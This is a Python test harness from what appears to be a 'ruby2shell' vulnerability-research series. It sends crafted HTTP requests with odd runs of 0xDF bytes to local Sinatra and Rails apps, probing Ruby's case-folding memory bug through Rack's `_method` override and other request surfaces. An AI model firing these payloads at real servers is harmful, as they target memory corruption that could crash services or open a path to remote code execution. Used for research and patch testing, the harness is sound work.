#!/usr/bin/env python3
"""W371: sweep stock HTTP request surfaces for a second odd-sharp-s fold.

Runs on the same loopback-only, unmodified stock Sinatra / `rails new` apps
as W369/W370. Each variant is one ordinary HTTP/1.1 request on its own
connection; no middleware, debugger or memory writes are injected. The all-fold
preload (ruby2shell-w370-casemap-trace.rb) logs any String case operation that
reaches case_map. The known Rack::MethodOverride `_method` fold is included
only as an opt-in liveness control and is tagged by its call site.

RUBY2SHELL_W371_SURFACES=comma,separated,list narrows the sweep.
RUBY2SHELL_W371_CONTROL=1 adds the known `_method` multipart control.
Odd sharp-s count = 21 in every variant, with no raw 0xDF in the request
target (percent-encoded there) so the server parses the request at all.
W372 adds charset-tagged (ISO-8859-1) JSON and urlencoded bodies with raw 0xDF
keys/values; the opt-in form-charset-method is the known `_method` sink.
W375 adds the other 11 single-byte encodings fixed in the same Ruby commit.
W376 adds a multipart field AFTER the `_method` part, plus an even-N safe
control; opt-in response digests make response bytes comparable across arms.
W377 adds a variable-length post-field (`RUBY2SHELL_W377_POSTLEN`) so the
wire-chosen allocation following `_method` can be swept under valgrind.
"""

import hashlib
import os
import socket
import sys

HOST = "127.0.0.1"
PATH = b"/up"
N = 21
SHARP = b"\xdf" * N
PCT = b"%DF" * N
ODD = b"a" + SHARP
SAFE = b"a" + b"\xdf" * 20
POST = b"postfield-marker-W376-ABCDEFGH"
BOUNDARY = b"XW371BOUND"

ALL = [
    "query-key", "query-val", "cookie-name", "cookie-val", "auth-scheme",
    "accept", "content-type", "json-raw", "json-escaped", "header-value",
    "form-body", "multipart-part", "json-charset-val", "json-charset-key",
    "form-charset-val", "form-charset-key",
]

METHOD_CHARSETS = {
    "method-odd": b"ISO-8859-1",
    "method-iso8859-2": b"ISO-8859-2",
    "method-iso8859-3": b"ISO-8859-3",
    "method-iso8859-4": b"ISO-8859-4",
    "method-iso8859-9": b"ISO-8859-9",
    "method-iso8859-10": b"ISO-8859-10",
    "method-iso8859-13": b"ISO-8859-13",
    "method-iso8859-14": b"ISO-8859-14",
    "method-iso8859-15": b"ISO-8859-15",
    "method-iso8859-16": b"ISO-8859-16",
    "method-windows-1250": b"windows-1250",
    "method-windows-1252": b"windows-1252",
    "method-windows-1254": b"windows-1254",
    "method-windows-1257": b"windows-1257",
}


def build(surface):
    """Return (method, target, [(header, value)], body)."""
    headers = [(b"Host", b"127.0.0.1")]
    if surface == "query-key":
        return b"GET", PATH + b"?" + PCT + b"=v", headers, b""
    if surface == "query-val":
        return b"GET", PATH + b"?k=" + PCT, headers, b""
    if surface == "cookie-name":
        return b"GET", PATH, headers + [(b"Cookie", PCT + b"=v")], b""
    if surface == "cookie-val":
        return b"GET", PATH, headers + [(b"Cookie", b"k=" + PCT)], b""
    if surface == "auth-scheme":
        return b"GET", PATH, headers + [(b"Authorization", SHARP + b" abc")], b""
    if surface == "accept":
        return b"GET", PATH, headers + [(b"Accept", b"text/" + SHARP)], b""
    if surface == "content-type":
        return (b"POST", PATH,
                headers + [(b"Content-Type", b"application/" + SHARP)],
                b"x=" + PCT)
    if surface == "json-raw":
        return (b"POST", PATH, headers + [(b"Content-Type", b"application/json")],
                b'{"k":"' + SHARP + b'"}')
    if surface == "json-escaped":
        return (b"POST", PATH, headers + [(b"Content-Type", b"application/json")],
                b'{"k":"' + b"\\u00df" * N + b'"}')
    if surface == "header-value":
        return b"GET", PATH, headers + [(b"X-W371", SHARP)], b""
    if surface == "form-body":
        return (b"POST", PATH,
                headers + [(b"Content-Type", b"application/x-www-form-urlencoded")],
                b"k=" + PCT)
    if surface == "json-charset-val":
        return (b"POST", PATH,
                headers + [(b"Content-Type",
                            b"application/json; charset=ISO-8859-1")],
                b'{"k":"' + SHARP + b'"}')
    if surface == "json-charset-key":
        return (b"POST", PATH,
                headers + [(b"Content-Type",
                            b"application/json; charset=ISO-8859-1")],
                b'{"' + SHARP + b'":"v"}')
    if surface == "form-charset-val":
        return (b"POST", PATH,
                headers + [(b"Content-Type",
                            b"application/x-www-form-urlencoded; charset=ISO-8859-1")],
                b"k=" + SHARP)
    if surface == "form-charset-key":
        return (b"POST", PATH,
                headers + [(b"Content-Type",
                            b"application/x-www-form-urlencoded; charset=ISO-8859-1")],
                SHARP + b"=v")
    if surface == "multipart-part":
        body = (b"--" + BOUNDARY + b"\r\n"
                b'Content-Disposition: form-data; name="left"\r\n'
                b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
                + ODD + b"\r\n--" + BOUNDARY + b"--\r\n")
        return (b"POST", PATH,
                headers + [(b"Content-Type",
                            b"multipart/form-data; boundary=" + BOUNDARY)],
                body)
    if surface in METHOD_CHARSETS:
        charset = METHOD_CHARSETS[surface]
        body = (b"--" + BOUNDARY + b"\r\n"
                b'Content-Disposition: form-data; name="_method"\r\n'
                b"Content-Type: text/plain; charset=" + charset + b"\r\n\r\n"
                + ODD + b"\r\n--" + BOUNDARY + b"--\r\n")
        return (b"POST", PATH,
                headers + [(b"Content-Type",
                            b"multipart/form-data; boundary=" + BOUNDARY)],
                body)
    if surface in ("method-postfield", "method-postfield-safe",
                   "method-postfield-size", "method-postfield-size-safe"):
        if surface.endswith("-safe"):
            operand = SAFE
        else:
            operand = ODD
        if "size" in surface:
            postlen = int(os.environ.get("RUBY2SHELL_W377_POSTLEN", "30"))
            if postlen < 0:
                raise ValueError("negative W377 post-field length")
            post = (POST + b"A" * postlen)[:postlen]
        else:
            post = POST
        body = (b"--" + BOUNDARY + b"\r\n"
                b'Content-Disposition: form-data; name="_method"\r\n'
                b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
                + operand +
                b"\r\n--" + BOUNDARY + b"\r\n"
                b'Content-Disposition: form-data; name="after"\r\n'
                b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
                + post +
                b"\r\n--" + BOUNDARY + b"--\r\n")
        return (b"POST", PATH,
                headers + [(b"Content-Type",
                            b"multipart/form-data; boundary=" + BOUNDARY)],
                body)
    if surface == "form-charset-method":
        return (b"POST", PATH,
                headers + [(b"Content-Type",
                            b"application/x-www-form-urlencoded; charset=ISO-8859-1")],
                b"_method=" + ODD)
    raise ValueError("unknown surface " + surface)


def main():
    port = int(sys.argv[1])
    response_summary = os.environ.get("RUBY2SHELL_W376_RESPONSE", "0") == "1"
    surfaces = os.environ.get("RUBY2SHELL_W371_SURFACES", ",".join(ALL)).split(",")
    if os.environ.get("RUBY2SHELL_W371_CONTROL", "0") == "1":
        surfaces.append("method-odd")
        surfaces.append("form-charset-method")
    for surface in surfaces:
        method, target, headers, body = build(surface.strip())
        request = method + b" " + target + b" HTTP/1.1\r\n"
        for name, value in headers:
            request += name + b": " + value + b"\r\n"
        request += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        request += b"Connection: close\r\n\r\n" + body
        head = "ERR unknown"
        response = b""
        try:
            with socket.create_connection((HOST, port), timeout=5) as sock:
                sock.sendall(request)
                chunks = []
                while True:
                    data = sock.recv(65536)
                    if not data:
                        break
                    chunks.append(data)
            response = b"".join(chunks)
            head = response.split(b"\r\n", 1)[0].decode("latin-1")
        except Exception as exc:
            head = "ERR %s" % type(exc).__name__
        print("surface=%s head=%s" % (surface, head), flush=True)
        if response_summary:
            print("surface=%s response-len=%d response-sha256=%s response-body=%r"
                  % (surface, len(response),
                     hashlib.sha256(response).hexdigest(),
                     response.decode("latin-1")), flush=True)


if __name__ == "__main__":
    main()
